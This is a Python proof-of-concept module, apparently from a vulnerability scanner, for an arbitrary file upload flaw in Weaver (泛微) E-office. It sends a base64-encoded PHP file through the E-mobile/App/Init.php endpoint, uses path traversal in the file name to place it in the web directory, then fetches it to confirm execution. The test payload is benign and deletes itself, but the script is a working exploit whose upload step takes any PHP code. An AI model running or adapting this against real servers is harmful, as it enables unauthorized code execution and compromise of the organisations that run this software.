import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        headers = {
            'Referer': url1
        }
        filename = 'testa123.php'
        path = 'E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../' + filename
        base_resp = requests.get(url1+path ,cookies=s_cookie,proxies=proxies,headers=headers, verify=False,timeout=10)
        if  base_resp.status_code == 200 and '提交成功' in base_resp.text and '新建成功' in base_resp.text:
            path1 = 'attachment/' + filename
            resp1 = requests.get(url1+path1,cookies=s_cookie,proxies=proxies,headers=headers,verify=False,timeout=10)
            if resp1.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in resp1.text:
                cdd="[+]漏洞存在\n"+str(path1)
            else:
                cdd = '[-]漏洞不存在_2\n'
        else:
            cdd='[-]漏洞不存在_1\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 E-office /E-mobile/App/init.php文件上传 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)